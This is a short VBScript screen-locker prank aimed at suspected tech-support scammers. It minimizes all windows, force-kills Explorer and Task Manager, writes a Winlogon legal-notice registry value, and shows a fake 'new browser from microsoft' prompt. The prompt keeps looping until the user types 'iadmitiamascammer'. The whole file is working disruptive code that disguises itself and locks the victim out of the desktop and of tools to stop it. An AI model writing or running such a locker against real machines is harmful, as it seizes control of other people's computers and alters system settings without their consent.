Option Explicit
On Error Resume Next
Dim Objshell, Password, YourPass, objApp
Set Objshell = CreateObject("WScript.shell")
Set objApp = CreateObject("Shell.Application")
objApp.MinimizeAll
Objshell.Run "Taskkill /F /IM Explorer.exe /IM Taskmgr.exe",0
WScript.Sleep 500
Objshell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeCaption", "Screen Lock", "REG_SZ"
Sub Pass
	Password = InputBox("Hey scammer welcome to the new browser from microsoft.", "You have been fooled")
	If Password = ("iadmitiamascammer") Then
			Dim correct
			Correct = Msgbox("Thanks for admiting you are a scammer",64,"SCAMMER")
			Objshell.run "explorer.exe"
			objApp.UndoMinimizeALL
			WScript.Quit
		Elseif IsEmpty(Password) Then
			Call Pass
		Else
			Dim Incorrect
			Incorrect = MsgBox("Incorrect Password! Please Try Again.",16,"Screen Lock")
			Call pass
	End If
End Sub

Call Pass